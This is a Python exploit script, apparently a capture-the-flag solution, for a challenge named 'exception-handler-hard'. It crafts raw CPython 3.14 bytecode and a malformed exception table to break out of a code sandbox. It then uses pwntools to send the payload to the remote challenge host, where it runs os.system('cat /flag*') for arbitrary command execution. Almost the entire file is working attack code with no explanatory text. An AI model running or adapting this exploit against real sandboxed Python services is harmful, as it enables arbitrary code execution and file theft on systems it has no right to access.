from opcode import opmap
from dis import dis
from ast import literal_eval, parse
import sys

if tuple(sys.version_info)[:3] != (3, 14, 0):
    exit(f"Solution will not work for version {sys.version}")

for k, v in opmap.items():
    globals()[k] = v

code = bytes([
    EXTENDED_ARG, 0xff,
    EXTENDED_ARG, 0xff,
    EXTENDED_ARG, 0xff,
    LOAD_FAST, 0xfa,
    EXTENDED_ARG, 0x83,
    UNPACK_EX, 0,
    POP_TOP, 0,
    EXTENDED_ARG, 0xff,
    EXTENDED_ARG, 0xff,
    EXTENDED_ARG, 0xff,
    LOAD_FAST, 0xfa,
    SWAP, 2,
    BINARY_OP, 26,
    CACHE, 0,
    CACHE, 0,
    CACHE, 0,
    CACHE, 0,
    CACHE, 0,
    PUSH_NULL, 0,
    CALL, 0,
    CACHE, 0,
    CACHE, 0,
    CACHE, 0,
    EXTENDED_ARG, 0xff,
    EXTENDED_ARG, 0xff,
    EXTENDED_ARG, 0xff,
    LOAD_FAST, 0xfa,
    LOAD_CONST, 2,
    BINARY_OP, 26,
    CACHE, 0,
    CACHE, 0,
    CACHE, 0,
    CACHE, 0,
    CACHE, 0,
    SWAP, 2,
    PUSH_NULL, 0,
    SWAP, 2,
    CALL, 1,
    CACHE, 0,
    CACHE, 0,
    CACHE, 0,
    RETURN_VALUE, 0
])

def gen_table(start_offset, size, handler, level, lasti):
    def encode(val):
        if val == 0:
            return b"\0"
        
        chunks = []
        while val:
            chunks.append(val & 63)
            val >>= 6
        
        chunks.reverse()
        
        result = []
        for i, chunk in enumerate(chunks):
            if i < len(chunks) - 1:
                result.append(chunk | 64)
            else:
                result.append(chunk)
        
        return bytes(result)
    
    result = bytearray(b"".join(map(encode, [start_offset // 2, size, handler // 2, (level << 1) | (lasti & 1)])))
    result[0] |= 0x80
    assert not any(v & 0x80 for v in result[1:])
    return bytes(result)

# SIZE, OFFSET = 0x1b8, 0xd500
SIZE, OFFSET = 0x1d0, 0xd160

exc_table = gen_table(226, 10, OFFSET - 0x660, 0, 0) + gen_table(1000, 8, 34, 0, 0)
exc_table = exc_table.ljust(SIZE - len(code), b"\x1b") + code
assert exc_table[len(exc_table) // 2] == 0x1b

from pwn import *

p = remote("exception-handler-hard.challs.infobahnc.tf", 1337)

p.sendlineafter(b"Table > ", exc_table.hex().encode())
p.sendlineafter(b"Code > ", b"print(1)")

p.sendline(b"__import__('os').system('cat /flag*')")

p.interactive()